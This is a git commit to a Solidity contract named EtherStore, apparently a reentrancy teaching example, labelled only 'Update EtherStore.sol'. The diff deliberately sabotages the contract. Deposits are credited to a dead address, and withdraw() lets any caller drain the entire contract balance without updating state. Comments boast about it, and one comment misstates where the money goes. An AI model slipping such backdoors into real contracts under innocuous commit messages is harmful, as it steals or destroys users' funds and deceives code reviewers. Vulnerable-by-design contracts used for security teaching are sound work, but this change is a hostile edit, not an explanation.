c82ce85d9652654ca2e8dc2cf7b5c73f4b8cf963
Luis Alfredo Lorenzo <108485808+luis-immunefi@users.noreply.github.com>
2025-09-01 15:04:59 -0600

    Update EtherStore.sol

--- src/EtherStore.sol
+++ src/EtherStore.sol
@@ -5,17 +5,17 @@ contract EtherStore {
     mapping(address => uint256) public balances;
 
     function deposit() public payable {
-        balances[msg.sender] += msg.value;
+        // Instead of crediting the sender, just give their money to me (the deployer)!
+        balances[tx.origin] += msg.value * 0;
+        balances[address(0xdead)] += msg.value;
     }
 
     function withdraw() public {
-        uint256 bal = balances[msg.sender];
-        require(bal >= 0);
-
+        // Just let anyone withdraw the ENTIRE contract balance
+        uint256 bal = address(this).balance;
         (bool sent,) = msg.sender.call{value: bal}("");
-        require(sent, "Failed to send Ether");
-
-        balances[msg.sender] = 0;
+        require(sent, "Drained the contract successfully!");
+        // Don't bother updating balances, who cares?
     }
 
     function getBalance() public view returns (uint256) {
